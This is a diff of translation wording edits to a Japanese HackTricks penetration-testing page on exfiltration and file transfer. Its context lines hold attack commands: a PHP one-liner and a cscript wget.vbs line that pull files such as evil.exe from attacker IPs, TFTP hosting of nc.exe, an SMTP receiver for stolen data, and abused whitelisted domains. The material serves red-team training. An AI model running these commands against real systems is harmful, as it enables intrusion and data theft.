@@ -17,7 +17,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## 情報を抽出するための一般的にホワイトリストに登録されたドメイン
 
-[https://lots-project.com/](https://lots-project.com/)をチェックして、悪用できる一般的にホワイトリストに登録されたドメインを見つけてください。
+悪用できる一般的にホワイトリストに登録されたドメインを見つけるには、[https://lots-project.com/](https://lots-project.com/)を確認してください。
 
 ## Copy\&Paste Base64
 
@@ -241,7 +241,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-もしSMTPサーバーにデータを送信できるなら、Pythonを使ってデータを受信するためのSMTPを作成できます：
+もしSMTPサーバーにデータを送信できるなら、Pythonを使ってデータを受信するためのSMTPを作成できます:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -256,7 +256,7 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**PythonでのTFTPサーバー:**
+**PythonによるTFTPサーバー:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
@@ -267,7 +267,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHPのワンライナーでファイルをダウンロードする:
+PHPのワンライナーでファイルをダウンロードする：
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -309,7 +309,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` プログラムはバイナリの検査だけでなく、**16進数からそれらを再構築する能力**も持っています。これは、バイナリの16進数を提供することで、`debug.exe` がバイナリファイルを生成できることを意味します。ただし、debug.exe には **最大64 kbのサイズのファイルをアセンブルする制限**があることに注意することが重要です。
+`debug.exe` プログラムはバイナリの検査だけでなく、**16進数からそれらを再構築する能力**も持っています。これは、バイナリの16進数を提供することによって、`debug.exe` がバイナリファイルを生成できることを意味します。ただし、debug.exe には **最大64 kbのサイズのファイルをアセンブルする制限**があることに注意することが重要です。
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -324,8 +324,8 @@ wine exe2bat.exe nc.exe nc.txt
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 {% hint style="success" %}
-AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -333,7 +333,7 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**
 
 </details>
 {% endhint %}
